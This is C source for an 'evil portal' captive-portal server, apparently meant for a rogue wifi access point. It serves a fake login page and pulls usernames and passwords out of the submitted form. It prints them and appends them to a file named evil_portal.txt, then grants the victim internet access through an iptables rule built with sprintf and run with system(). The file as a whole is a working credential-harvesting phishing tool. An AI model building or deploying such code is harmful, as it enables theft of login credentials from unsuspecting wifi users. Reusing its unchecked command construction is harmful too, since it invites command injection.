#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>

#ifdef HOST_BUILD
#define PORT 8080
#else
#define PORT 80
#endif

#define BUF_SIZE 4096

void serve_static_file(int client_socket, const char* filename, const char* content_type) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        const char* error_response = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n";
        send(client_socket, error_response, strlen(error_response), 0);
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char* buffer = malloc(file_size + 1);
    fread(buffer, 1, file_size, file);
    buffer[file_size] = '\0';

    char response_headers[256];
    snprintf(response_headers, sizeof(response_headers), 
             "HTTP/1.1 200 OK\r\n"
             "Content-Type: %s\r\n"
             "Content-Length: %ld\r\n\r\n", content_type, file_size);
    send(client_socket, response_headers, strlen(response_headers), 0);

    send(client_socket, buffer, file_size, 0);

    free(buffer);
    fclose(file);
}

void serve_html(int client_socket, const char* html_file_path) {
    serve_static_file(client_socket, html_file_path, "text/html");
}

void redirect_user(int client_socket) {
    const char* redirect_response = 
        "HTTP/1.1 302 Found\r\n"
        "Location: http://www.google.com\r\n"
        "Content-Length: 0\r\n\r\n";
    send(client_socket, redirect_response, strlen(redirect_response), 0);
}

void handle_login(int client_socket, char* body, const char* client_ip, const char* wlan_x) {
    char* username = NULL;
    char* password = NULL;
    char cmd[256];

    // You shall pass
    sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -s %s -j MASQUERADE", wlan_x, client_ip);
    printf("$ %s\n", cmd);

#ifndef HOST_BUILD
    system(cmd);
#endif

    // Keep your shit
#ifdef HOST_BUILD
    FILE *file = fopen("evil_portal.txt", "a");
#else
    FILE *file = fopen("/mnt/evil_portal.txt", "a");
#endif

    if (file == NULL) {
        printf("Error opening file.\n");
        return;
    }

    fprintf(file, "%s\n", body);

    username = strstr(body, "username=");
    username += strlen("username=");
    char* username_end = strstr(username, "&");
    *username_end = '\0';

    password = username_end + 1;
    password += strlen("password=");

    printf("UN: %s, PW: %s\n", username, password);
    fprintf(file, "\n\nUN: %s, PW: %s\n", username, password);

    if (body) {
        body += 4;  // Skip the \r\n\r\n to get to the actual body
        const char* success_response = 
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n\r\n"
            "<html><body><h2>Login successful!</h2><p>You will be redirected...</p></body></html>";
        send(client_socket, success_response, strlen(success_response), 0);
        redirect_user(client_socket);
    }

    fclose(file);    
}

int server_fd = -1;

void handle_signal(int signal) {
    if (signal == SIGTERM) {
        if (server_fd != -1) {
            close(server_fd);
            printf("Socket closed successfully.\n");
        };
        exit(0);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <path_to_index_html> <wlanX>\n", argv[0]);
        return 1;
    }
    signal(SIGTERM, handle_signal);

    const char *html_file_path = argv[1];
    const char *wlan_x = argv[2];

    int client_socket, valread;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUF_SIZE] = {0};
    
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 10) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Captive portal server started on port %d...\n", PORT);
    printf("Serving HTML from: %s\n", html_file_path);

    while (1) {
        if ((client_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
            perror("Accept failed");
            exit(EXIT_FAILURE);
        }

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(address.sin_addr), client_ip, INET_ADDRSTRLEN);

        valread = read(client_socket, buffer, BUF_SIZE);
        if (valread > 0) {
            if (strncmp(buffer, "GET / ", 6) == 0) {
                serve_html(client_socket, html_file_path);
            }
            else if (strncmp(buffer, "POST /login", 11) == 0) {
                handle_login(client_socket, buffer, client_ip, wlan_x);
            }
        }

        close(client_socket);
    }

    return 0;
}

